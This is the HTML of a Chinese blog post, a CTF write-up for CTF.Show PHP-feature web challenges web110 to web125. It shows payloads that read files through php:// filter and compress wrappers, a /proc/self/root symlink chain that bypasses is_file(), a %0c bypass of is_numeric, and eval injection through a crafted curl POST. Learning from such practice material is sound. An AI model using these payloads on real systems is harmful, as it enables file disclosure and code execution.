@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://guo.moe/favicon.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://guo.moe/favicon.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guo.moe","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="web110PHP Version: 7.3.11 仍未解决 知识点 对 PHP 原生类的运用  做题从这题可以看出，这里考察的是对PHP原生类和原生函数的结合运用，但由于我也没啥知识储备，所以还是得先翻一下资料，顺便看一下hint 想写下列代码尝试一下，利用 FilesystemIterator 获取指定目录下的所有文件，但是不知道为什么只返回了一个文件名？为什么在这题就可以返回flag的txt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【Klee-CTF】CTF.Show Web入门 PHP 特性 2 web110~web128">
+<meta property="og:url" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-Feature-2.html">
+<meta property="og:site_name" content="果果说">
+<meta property="og:description" content="web110PHP Version: 7.3.11 仍未解决 知识点 对 PHP 原生类的运用  做题从这题可以看出，这里考察的是对PHP原生类和原生函数的结合运用，但由于我也没啥知识储备，所以还是得先翻一下资料，顺便看一下hint 想写下列代码尝试一下，利用 FilesystemIterator 获取指定目录下的所有文件，但是不知道为什么只返回了一个文件名？为什么在这题就可以返回flag的txt">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-Feature-2/Untitled.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-Feature-2/screen.gif">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-Feature-2/Untitled%201.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-Feature-2/Untitled%202.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-Feature-2/Untitled%203.png">
+<meta property="article:published_time" content="2021-08-30T04:00:00.000Z">
+<meta property="article:modified_time" content="2021-08-30T12:28:36.000Z">
+<meta property="article:author" content="Guoguo">
+<meta property="article:tag" content="果果说">
+<meta property="article:tag" content="果果的博客">
+<meta property="article:tag" content="Guoguo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-Feature-2/Untitled.png">
+
+<link rel="canonical" href="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-Feature-2.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>【Klee-CTF】CTF.Show Web入门 PHP 特性 2 web110~web128 | 果果说</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-69554402-1"></script>
+    <script data-pjax>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-69554402-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="果果说" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">果果说</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Guoguo's Blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-友情链接">
+
+    <a href="/links/" rel="section"><i class="fa fa-user fa-fw"></i>友情链接</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-Feature-2.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://guo.moe/favicon.jpg">
+      <meta itemprop="name" content="Guoguo">
+      <meta itemprop="description" content="找不到路，就自己走一条出来。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="果果说">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【Klee-CTF】CTF.Show Web入门 PHP 特性 2 web110~web128
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-30 12:00:00 / 修改时间：20:28:36" itemprop="dateCreated datePublished" datetime="2021-08-30T12:00:00+08:00">2021-08-30</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/" itemprop="url" rel="index"><span itemprop="name">技术篇</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h1><p><code>PHP Version: 7.3.11</code></p>
+<p>仍未解决</p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>对 PHP 原生类的运用</li>
+</ul>
+<h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>从这题可以看出，这里考察的是对PHP原生类和原生函数的结合运用，但由于我也没啥知识储备，所以还是得先翻一下资料，<del>顺便看一下hint</del></p>
+<p>想写下列代码尝试一下，利用 FilesystemIterator 获取指定目录下的所有文件，但是不知道为什么只返回了一个文件名？为什么在这题就可以返回flag的txt，如果恰好flag的名字不在第一个怎么办？</p>
+<span id="more"></span>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$b</span> = getcwd();</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="variable">$b</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>
+
+<p>令我更不明白的是，为什么我这里调用的是 web110.php，他给我返回了一个 web261.php？</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-Feature-2/Untitled.png" alt="Untitled"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.extrader.top/posts/35c0085d/">https://www.extrader.top/posts/35c0085d/</a>  php原生类利用</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/refs.basic.other.php">https://www.php.net/manual/zh/refs.basic.other.php</a> PHP 基本扩展</li>
+</ul>
+<h1 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h1><p><code>PHP Version: 7.3.11</code></p>
+<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>变量覆盖</li>
+</ul>
+<h2 id="做题-1"><a href="#做题-1" class="headerlink" title="做题"></a>做题</h2><p>我原本想的是 v1 = ctfshow, v2 = flag 的，执行后发现为null，于是就逐个断点调试看看是什么情况。</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-Feature-2/screen.gif" alt="screen.gif"></p>
+<p>可以看到，这个 $flag 进来以后就没了，那怎么办呢，其实 $flag 在外部已经被定义了，所以他算是一个全局变量，只要我们查看 GLOBALS 的值即可拿到 flag，也就是说 v1 写 ctfshow，v2 写 GLOBALS。</p>
+<h1 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><p><code>PHP Version: 7.3.11</code></p>
+<ul>
+<li>函数绕过</li>
+<li>PHP 伪协议读取文件</li>
+</ul>
+<h2 id="做题-2"><a href="#做题-2" class="headerlink" title="做题"></a>做题</h2><p>首先可以看到，这里面过滤了 ..|http|https|data|input|rot13|base64|string ，如果没有这个，可以考虑用 <a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a> 来绕过。其他绕过方式也可参考参考资料[1]。</p>
+<p>然后我们看到 is_file($file) 这里做了一层判断，也就是说不能直接读取文件，不过我们可以借此判断是否存在文件。输入 /?file=/var/www/html/flag.php 返回 hacker! 代表存在该文件。</p>
+<p>根据官方提示以及参考资料[2]，我们可以通过以下几种方式获取文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br><span class="line">compress.zlib:<span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>前三种方式不乏都是通过 PHP 流过滤器加上各种转换（见参考资料[3]）与最终 resource=flag.php 拿到 flag，最后一种则是通过压缩流与调取本地文件拿到</p>
+<p>并且看起来 read= 可以忽略，主要是看转换，更多过滤器可见参考资料 [4]</p>
+<p>不过最后一种在 highlight_file 遇到以后是会自动解压吗？不是很懂</p>
+<h2 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html">https://www.cnblogs.com/wjrblogs/p/12285202.html</a> CTF中常用的php伪协议利用</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a> php:// — 访问各个输入/输出流（I/O streams）</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.convert.php">https://www.php.net/manual/zh/filters.convert.php</a> 转换过滤器</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a> 可用过滤器列表</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.compression.php">https://www.php.net/manual/zh/wrappers.compression.php</a></li>
+</ul>
+<h1 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h1><p><code>PHP Version: 7.3.11</code></p>
+<h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>函数绕过</li>
+<li>PHP 压缩流协议使用</li>
+<li>多次软链接绕过 is_file()</li>
+</ul>
+<h2 id="做题-3"><a href="#做题-3" class="headerlink" title="做题"></a>做题</h2><h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p>细节其实和上题差不多，只不过 filter 被限制使用了，还是可以用压缩流来绕过。</p>
+<p>但我不明白，为什么不能用 zip:// 和 bzip2:// ，只能用 zlib2:// ?</p>
+<blockquote>
+<p>zlib: 的功能类似 gzopen()，但是 <strong>其数据流还能被 fread() 和其他文件系统函数使用</strong>。 不建议使用，因为会和其他带“:”字符的文件名混淆； 请使用 compress.zlib:// 替代。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.compression.php">zlib://</a></p>
+<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>经过20次软链接可以绕过 is_file()</p>
+<p><code>/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p>
+<p>原来还有 /proc/self/root 软链接这种方法，学到了</p>
+<h1 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h1><p><code>PHP Version: 7.3.11</code></p>
+<h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>函数绕过</li>
+<li>PHP 伪协议读取文件</li>
+</ul>
+<h2 id="做题-4"><a href="#做题-4" class="headerlink" title="做题"></a>做题</h2><p>这题拦截了 compress，拦截了convert，但又不拦截 filter 了，奇怪。</p>
+<p><code>php://filter/resource=flag.php</code></p>
+<h1 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h1><p><code>PHP Version: 7.3.11</code></p>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 15:08:19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> trim(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> filter(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>通过 \f 绕过 is_numberic() 与 trim()</li>
+</ul>
+<h2 id="做题-5"><a href="#做题-5" class="headerlink" title="做题"></a>做题</h2><p>首先我们分析题目，此处将十六进制和八进制的方法给pass掉了，所以无法使用十六进制或八进制来直接绕过。其次，此处使用了 is_numeric 与 trim 来判断。is_numeric 用于判断是否为数字，通过 trim 过滤字符，trim 的语法见下</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-Feature-2/Untitled%201.png" alt="Untitled"></p>
+<blockquote>
+<p><strong>is_numeric函数在开始判断前，会先跳过所有空白字符。</strong>可是题目获取$req[‘number’]的时候明明使用trim过滤了空白字符这时候我们可以引入\f（也就是%0c）在数字前面，来绕过最后那个is_palindrome_number函数，而<strong>对于前面的数字判断，因为intval和is_numeric都会忽略这个字符，所以不会影响。</strong><br>————————————————<br>版权声明：本文为CSDN博主「EvilGenius-」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36609913/article/details/79296052">https://blog.csdn.net/qq_36609913/article/details/79296052</a></p>
+</blockquote>
+<p>所以，我们只需要在36前面添加 %0c 即 \f 的 urlencode 即可绕过，</p>
+<h2 id="参考资料-2"><a href="#参考资料-2" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/109731923">https://blog.csdn.net/qq_44657899/article/details/109731923</a> ctfshow-web115（\f绕过is_numberic()+trim()）</li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36609913/article/details/79296052">https://blog.csdn.net/qq_36609913/article/details/79296052</a> PHP代码审计(绕过过滤的空白字符)</li>
+</ul>
+<h1 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h1><p><code>PHP Version: 7.4.9</code></p>
+<h2 id="做题-6"><a href="#做题-6" class="headerlink" title="做题"></a>做题</h2><p>思路错了。。我一开始在想怎么给 fl0g 赋值为 flag_give_me，但完全没有想到在eval可以直接echo一个$flag。。。</p>
+<p>我们按照代码的判断条件来操作，结果最后发现 POST 上去的小数点 . 被转换为了下划线 _</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-Feature-2/Untitled%202.png" alt="Untitled"></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.variables.external.php">PHP: 来自 PHP 之外的变量 - Manual</a></p>
+<blockquote>
+<p>注意:<br>变量名中的点和空格被转换成下划线。例如 <input name="a.b" /> 变成了 $_REQUEST[“a_b”]。</p>
+</blockquote>
+<p>那有什么办法呢？结果后来发现，原来[也会被转换，PHP会将 [ 转换为 . 这不刚好应了我的意吗？</p>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000019633304?sort=votes">PHP 对输入变量名的自动转换的问题与源码分析</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;a.b&quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;a_b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;a b&quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;a_b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;a[b&quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;a_b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;a]b&quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;a]b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;a-b&quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;a-b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot; ab&quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;ab&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;ab &quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;ab &quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[a.b]&quot;</span> /&gt;   转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr&quot;</span>][<span class="string">&quot;a.b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;ar.r[a.b]&quot;</span> /&gt;  转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;ar_r&quot;</span>][<span class="string">&quot;a.b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[a[b]]&quot;</span> /&gt;  转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr&quot;</span>][<span class="string">&quot;a[b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[a[]x]&quot;</span> /&gt;  转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr&quot;</span>][<span class="string">&quot;a[&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[]ab&quot;</span> /&gt;    转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr&quot;</span>][<span class="number">0</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[a]b&quot;</span> /&gt;    转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr&quot;</span>][<span class="string">&quot;a&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[a.b&quot;</span> /&gt;    转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr_a.b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[[a.b&quot;</span> /&gt;   转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr_[a.b&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>按照题目，第一个 [ 会被置换为下划线，之后的.就不会被转换，因此该题中 CTF_SHOW.COM 的参数应为 CTF[SHOW.COM</p>
+<p>所以最后请求参数为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://ef9d0de2-60eb-49b4-a94d-58f30c185f81.challenge.ctf.show:8080/&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;CTF_SHOW=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;CTF[SHOW.COM=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;fl0g=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;fun=&quot;echo $flag&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参考资料-3"><a href="#参考资料-3" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45551083/article/details/110574834">https://blog.csdn.net/weixin_45551083/article/details/110574834</a> CTFShow web入门123-150 (php特性(二))</li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/261802.html">https://www.freebuf.com/articles/web/261802.html</a> php代码审计前奏之ctfshow之php特性</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.variables.external.php">https://www.php.net/manual/zh/language.variables.external.php</a></li>
+<li><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000019633304?sort=votes">https://segmentfault.com/a/1190000019633304?sort=votes</a></li>
+</ul>
+<h1 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h1><p><code>PHP Version: 7.4.9</code></p>
+<h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>在eval中调用函数，使用其他变量来绕过检查。</li>
+</ul>
+<h2 id="做题-7"><a href="#做题-7" class="headerlink" title="做题"></a>做题</h2><p>我们其实可以在eval的参数中再eval其他变量，例如这样： <code>eval($_GET[0])</code> ，然后再设置参数0为 <code>echo $flag;</code>，不就可以了嘛？</p>
+<p>请求参数：</p>
